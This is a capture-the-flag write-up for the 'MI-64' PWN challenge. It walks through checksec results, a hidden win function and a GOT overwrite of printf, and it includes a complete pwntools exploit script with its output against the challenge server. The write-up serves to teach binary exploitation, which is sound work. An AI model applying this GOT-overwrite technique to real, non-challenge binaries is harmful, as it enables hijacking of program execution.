# MI-64 Registry System - CTF Writeup

**Challenge:** MI-64
**Category:** PWN
**Points:** 50

![](attachments/Pasted%20image%2020251130124920.png)


## Initial Analysis

First, we analyze the binary security protections using `checksec`:

```bash
$ checksec --file=got
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

**Key Findings:**
*   **No PIE:** The binary is loaded at a fixed address (`0x400000`), meaning function addresses are constant.
*   **No RELRO:** The Global Offset Table (GOT) is writable. This is a critical weakness.
*   **NX Enabled:** We cannot execute shellcode on the stack.

## Reverse Engineering

We examine the binary using `objdump` and find a few interesting functions:

### The `win` Function (`0x4011b6`)
There is a hidden function called `win` that is never explicitly called by `main`.
```assembly
00000000004011b6 <win>:
  4011b6:   push   rbp
  ...
  4011d5:   call   4010a0 <fopen@plt>  ; Opens flag.txt
  ...
  401200:   call   401030 <puts@plt>   ; Prints flag content
```
This function opens `flag.txt` and prints it. Our goal is to redirect execution here.

### The `registry` Function
The main logic resides in `registry`. It asks for an "Agent codename" and then offers a powerful capability:
1.  Asks for a **GOT address to modify**.
2.  Asks for an **8-byte value to write**.
3.  Writes the value to the address.

```c
// Pseudocode reconstruction
puts("Enter GOT address to modify...");
scanf("%lx", &target_addr);
puts("Enter 8-byte value to write...");
scanf("%lx", &value);
*target_addr = value; // Arbitrary Write!
```

After the write, the program proceeds to call `printf` and `puts`.

## Exploitation Strategy: GOT Overwrite

Since **RELRO** is disabled, the Global Offset Table (GOT) is writable. The GOT is used by the program to resolve dynamically linked functions (like `printf`, `puts`, `exit`) at runtime.

If we overwrite a GOT entry with the address of the `win` function, the next time the program calls that library function, it will jump to `win` instead.

**The Plan:**
1.  **Target:** The GOT entry for `printf` (`0x4035c8`).
    *   We chose `printf` because it is called immediately after our arbitrary write in the `registry` function.
2.  **Value:** The address of the `win` function (`0x4011b6`).
3.  **Trigger:** When the program calls `printf` to display the success message, it will instead execute `win`.

## The Exploit Script

We used `pwntools` to automate the interaction.

```python
from pwn import *

# Set up context
context.binary = './got'

def solve():
    # Connect to remote instance
    io = remote('38.60.200.116', 9004)

    # Addresses found via objdump/readelf
    got_printf = 0x4035c8  # Target GOT entry
    win_addr = 0x4011b6    # Address of win()

    # 1. Pass the initial check
    io.recvuntil(b'Enter Agent codename:')
    io.sendline(b'007')

    # 2. Send the address we want to overwrite (printf@got)
    io.recvuntil(b'Enter GOT address to modify (hex, e.g. 0x601018):')
    io.sendline(hex(got_printf).encode())

    # 3. Send the value to write (address of win function)
    io.recvuntil(b'Enter 8-byte value to write (hex, e.g. 0x4006b6):')
    io.sendline(hex(win_addr).encode())

    # 4. Enjoy the flag
    io.interactive()

if __name__ == '__main__':
    solve()
```

## The Result

```
python3 get_flag.py 
[*] '/home/remnux/Desktop/nova_writeup/pwn/04_MI_64/got'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to 38.60.200.116 on port 9004: Done
[*] Switching to interactive mode
 
*** MISSION SUCCESS: AUTHORIZED CHANNEL OPENED ***
Delivering flag:

NOVA_CTF{g0t_0v3rwr1t3_c4n_g3t_fl4g!}
Database write operation completed.

Thank you for using MI-64 registry node. Returning to HQ...
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to 38.60.200.116 port 9004
```


## Flag

`NOVA_CTF{g0t_0v3rwr1t3_c4n_g3t_fl4g!}`


![](attachments/Pasted%20image%2020251130130601.png)

